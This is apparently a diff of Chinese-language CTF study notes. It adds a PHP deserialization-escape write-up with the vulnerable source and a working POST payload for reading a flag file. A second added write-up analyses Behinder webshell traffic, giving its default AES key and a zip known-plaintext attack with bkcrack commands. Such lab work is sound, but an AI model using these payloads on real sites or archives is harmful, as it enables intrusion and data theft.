@@ -8197,9 +8197,71 @@ SSRF发送CRLF报文，建立键值对
 
 ![image-20240506202458129](CTF.assets/image-20240506202458129.png)
 
-访问`http://127.0.0.1:`
+访问`http://127.0.0.1:8888`
 
 ![image-20240506202521482](CTF.assets/image-20240506202521482.png)
+
+## [安洵杯 2019]easy_serialize_php 1
+
+> 考点：PHP反序列化逃逸-减少
+
+```php
+<?php
+
+$function = $_GET['f'];
+
+function filter($img)
+{
+    $filter_arr = array('php', 'flag', 'php5', 'php4', 'fl1g');
+    $filter = '/' . implode('|', $filter_arr) . '/i';
+    return preg_replace($filter, '', $img);
+}
+
+
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = $function;
+
+extract($_POST);
+
+
+if (!$_GET['img_path']) {
+    $_SESSION['img'] = base64_encode('guest_img.png');
+} else {
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+echo $serialize_info;
+
+
+var_dump($_SESSION);
+if ($function == 'highlight_file') {
+    highlight_file('index.php');
+} else if ($function == 'phpinfo') {
+    eval('phpinfo();'); //d0g3_f1ag.php
+} else if ($function == 'show_image') {
+    echo "show_image!!!";
+    $userinfo = unserialize($serialize_info);
+    var_dump($userinfo);
+    var_dump(base64_decode($userinfo['img']));
+    echo file_get_contents(base64_decode($userinfo['img']));
+}
+```
+
+本地测试拼接结果：基本上可控的地方就两个，一个是键，一个是值，最好的处理方法就是吃掉键把值逃出来
+
+```
+a:2:{s:7:"";s:50:";s:3:"111";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
+```
+
+```
+payload：
+POST提交：_SESSION[phpflag]=;s:3:"111";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+```
+
+
+
+
 
 
 
@@ -8263,6 +8325,57 @@ Archive:  00000000.zip
 └─$ cat flag.txt 
 flag{ev3n::y0u::bru7us?!} 
 ```
+
+## 高效网络安全管理运维赛 easyshell
+
+> 附件地址：链接：https://pan.baidu.com/s/1jVy1JSe6BQwEeihbwIdLow?pwd=34yw  提取码：34yw
+>
+> 考点：冰蝎4.0流量分析
+>
+> 参考：https://xz.aliyun.com/t/14341?time__1311=mqmx9Q0QiQ0%3DDQdDsNEkxfgZGmWwArD&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-2
+
+一进来就是冰蝎的流量，而且没有密钥上传的流量~~
+
+![image-20240507000741322](CTF.assets/image-20240507000741322.png)
+
+冰蝎用的是AES128加密，这里的密钥是冰蝎的默认密钥
+
+```
+$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
+```
+
+将冰蝎流量复制下来用AES128解密，这里的模式为**CBC模式**，再用base64解码就能拿到明文；第一个服务器的流量解不出来的（可能是我不会）
+
+![image-20240507000928020](CTF.assets/image-20240507000928020.png)
+
+整理下来大概就是攻击者在服务器下载了一个压缩包（有密码），一个文本文件（明文，且是压缩包里面的一个文件）
+
+通过攻击者的流量（红色）第五段可以看到下载压缩包的操作
+
+![image-20240507001253239](CTF.assets/image-20240507001253239.png)
+
+朔源代码如下：可以看到数据是**两次**base64编码的！！！
+
+![image-20240507001313410](CTF.assets/image-20240507001313410.png)
+
+后续就是check操作，大概就是校验文件的哈希
+
+![image-20240507001426492](CTF.assets/image-20240507001426492.png)
+
+![image-20240507001436222](CTF.assets/image-20240507001436222.png)
+
+将攻击者下载文件后，服务器返回的那一段流量解密并还原就能拿到两个文件，一个是`temp.zip`，一个是`secret2.txt`
+
+```
+# secret2.txt 文件内容如下：
+Hello, but what you're looking for isn't me.
+```
+
+这里很明显就是一个压缩包的明文攻击了！（明文攻击主要利用大于 12 字节的一段已知明文数据进行攻击，从而获取整个加密文档的数据。）
+
+![image-20240507001752028](CTF.assets/image-20240507001752028.png)
+
+
 
 
 
@@ -8703,7 +8816,7 @@ $ ../bkcrack -C secrets.zip -c spiral.svg -p plain.txt
 例如使用`easy`作为新密码，执行命令：
 
 ```
-COPY$ ../bkcrack -C secrets.zip -k c4490e28 b414a23d 91404b31 -U secrets_with_new_password.zip easy
+../bkcrack -C secrets.zip -k c4490e28 b414a23d 91404b31 -U secrets_with_new_password.zip easy
 ```
 
 > 命令格式为：bkcrack -C 加密的压缩包 -k 3个密钥 -U 新的压缩包 新密码
